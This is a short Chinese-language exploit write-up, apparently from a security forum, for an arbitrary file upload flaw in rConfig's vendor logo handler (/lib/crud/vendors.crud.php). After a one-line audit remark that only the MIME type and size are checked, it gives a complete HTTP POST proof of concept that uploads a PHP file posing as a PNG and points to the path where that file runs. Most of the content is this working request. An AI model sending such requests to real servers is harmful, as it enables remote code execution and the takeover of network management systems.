rConfig是一个开放源码的网络设备配置管理实用工具，用于网络工程师对网络设备的配置。

代码审计
----

/lib/crud/vendors.crud.php  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-6c8dbdd6ac4a7c7f20f26d6742acf7da30571694.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-6c8dbdd6ac4a7c7f20f26d6742acf7da30571694.png)  
可以看到只白名单了`type`类型和大小限制

漏洞复现
----

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-550af9f2c833342b81605c68030a9968e54d56a7.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-550af9f2c833342b81605c68030a9968e54d56a7.png)

POC:

```php
POST /lib/crud/vendors.crud.php HTTP/1.1
Host: xx.xx.xx.xx
Connection: close
Content-Length: 491
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36
Origin: https://xx.xx.xx.xx
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWpMXK6WIANv7xtCd
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: https://xx.xx.xx.xx/vendors.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=27bdb13b82eac5dab1a420d9699474ca

------WebKitFormBoundaryWpMXK6WIANv7xtCd
Content-Disposition: form-data; name="vendorName"

111
------WebKitFormBoundaryWpMXK6WIANv7xtCd
Content-Disposition: form-data; name="vendorLogo"; filename="111.php"
Content-Type: image/png

<?php phpinfo(); ?>
------WebKitFormBoundaryWpMXK6WIANv7xtCd
Content-Disposition: form-data; name="add"

add
------WebKitFormBoundaryWpMXK6WIANv7xtCd
Content-Disposition: form-data; name="editid"

------WebKitFormBoundaryWpMXK6WIANv7xtCd--
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-7bee249bb918eb8f7ec718b26acfb065dbbe7eeb.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-7bee249bb918eb8f7ec718b26acfb065dbbe7eeb.png)

访问上传的文件/images/vendor/111.php  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-aeb3615edb56411a327c0e7e80513a012530a867.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-aeb3615edb56411a327c0e7e80513a012530a867.png)